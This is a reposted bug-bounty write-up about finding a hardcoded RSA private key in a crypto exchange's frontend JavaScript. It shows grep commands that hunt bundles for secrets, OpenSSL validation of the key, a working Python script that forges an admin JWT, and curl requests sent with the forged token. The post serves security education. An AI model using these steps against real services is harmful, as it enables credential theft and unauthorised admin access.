# :locked_with_key: Download the main app bundle

> **Original Source:** [Download the main app bundle](https://infosecwriteups.com/how-i-found-a-hardcoded-rsa-private-key-in-a-major-crypto-exchanges-frontend-dd27b6a78fb2)
> **Platform:** infosecwriteups.com | **Category:** `CRYPTO`

---

## Phase 1: JavaScript Recon (Where the Gold Hides)


Most hunters jump straight to fuzzing endpoints or running automated scanners. I’ve learned that the real treasure is often hiding in plain sight — inside the frontend JavaScript bundles that ship directly to your browser.


```
# Download the main app bundle
curl -s https://static.target.com/web-frontend/client/app.xxxxx.js -o app.js
```


```
# Search for interesting keywords
grep -iE 'private_key|secret|password|api_key|token' app.js
```


And then it happened.


```
TRACK_PRIVATE_KEY: "MIICdQIBADANBgkqhkiG9w0BAQEFAA..."
```


My coffee went cold. I was looking at what appeared to be a complete RSA private key hardcoded inside a production JavaScript file — publicly accessible to anyone who visited the website.


My heart was racing.

## Phase 2: Validation — Is This Real?


First rule of bug bounty: don’t get excited until you validate. I extracted the key and ran it through OpenSSL immediately.


```
# Save and validate the key
cat > extracted.key << 'EOF'
-----BEGIN RSA PRIVATE KEY-----
MIICdQIBADANBgkqhkiG9w0BAQEFAASCAl8wggJbAgEAAoGBAIk9VvZx...
-----END RSA PRIVATE KEY-----
EOF
```


```
openssl rsa -in extracted.key -check -noout
```


Output:


```
RSA key ok
```


Then I checked the key specifications:


```
openssl rsa -in extracted.key -text -noout
```


```
Private-Key: (1024 bit, 2 primes)
modulus: 00:89:3d:56:f6:71:af...
publicExponent: 65537 (0x10001)
```


Confirmed. A real, valid, 1024-bit RSA private key. Sitting in a public JavaScript file. In production.


At this point, most hunters would immediately report “exposed private key.” I decided to go further.

## Phase 3: Can I Forge JWT Tokens With This?


The key was named `TRACK_PRIVATE_KEY` in the config object alongside other interesting variables:


```
{
baseHost: "https://api.target.com",
domain_env: "production",
TRACK_PRIVATE_KEY: "MIICdQIBADA...",
baseMainUrl: "http://internal-gateway.default.svc.cluster.local",
SENTRY_DSN: "https://xxxx@sentryingest.target.com/3"
}
```


Wait — `baseMainUrl` pointing to an internal Kubernetes cluster address? That's a whole separate finding. But the private key was the crown jewel.


I wrote a Python script to attempt JWT forgery:


```
import jwt
import time
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends import default_backend

PRIVATE_KEY_STR = """-----BEGIN RSA PRIVATE KEY-----
MIICdQIBADA...
-----END RSA PRIVATE KEY-----"""
PRIVATE_KEY = serialization.load_pem_private_key(
PRIVATE_KEY_STR.encode(),
password=None,
backend=default_backend()
)
# Extract public key for verification
PUBLIC_KEY = PRIVATE_KEY.public_key().public_bytes(
encoding=serialization.Encoding.PEM,
format=serialization.PublicFormat.SubjectPublicKeyInfo
)
# Forge an admin JWT
payload = {
"user_id": 1,
"email": "admin@target.com",
"role": "admin",
"permissions": ["*"],
"iat": int(time.time()),
"exp": int(time.time()) + 86400,
}
admin_token = jwt.encode(payload, PRIVATE_KEY, algorithm="RS256")
print(f"[+] Admin Token: {admin_token}")
# Self-verify with extracted public key
decoded = jwt.decode(admin_token, PUBLIC_KEY, algorithms=["RS256"])
print(f"[+] Verified: {decoded}")
```


Output:


```
[+] Admin Token: eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9...
[+] Verified: {
"user_id": 1,
"email": "admin@target.com",
"role": "admin",
"permissions": ["*"],
...
}
```


The JWT was cryptographically valid. I had successfully forged an admin token using their own private key.


This is the moment I made my first mistake.

## Phase 4: Where I Went Wrong


I was so excited that I skipped the most critical step: finding real API endpoints before testing.


I guessed endpoints:


```
ADMIN_TOKEN="eyJhbGciOiJSUzI1NiI..."

curl -s -H "Authorization: Bearer ${ADMIN_TOKEN}" \
https://api.target.com/v1/admin/users
# Response:
# {"code": -35, "msg": "route not found", "success": false}
curl -s -H "Authorization: Bearer ${ADMIN_TOKEN}" \
https://api.target.com/v1/wallet/balance
# Response:
# {"code": -35, "msg": "route not found", "success": false}
```


Every. Single. Endpoint. Route not found.


But here’s the critical error I made: I saw HTTP 200 on every response and told myself *“the API accepted my forged token!”*


It did not.


HTTP 200 + “route not found” = The path doesn’t exist.HTTP 200 + Real data = The token was accepted and processed.


These are fundamentally different things, and I confused them.

---

*Originally published on [Medium](https://infosecwriteups.com/how-i-found-a-hardcoded-rsa-private-key-in-a-major-crypto-exchanges-frontend-dd27b6a78fb2). All credit goes to the original author.*
*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of crypto CTF writeups.*
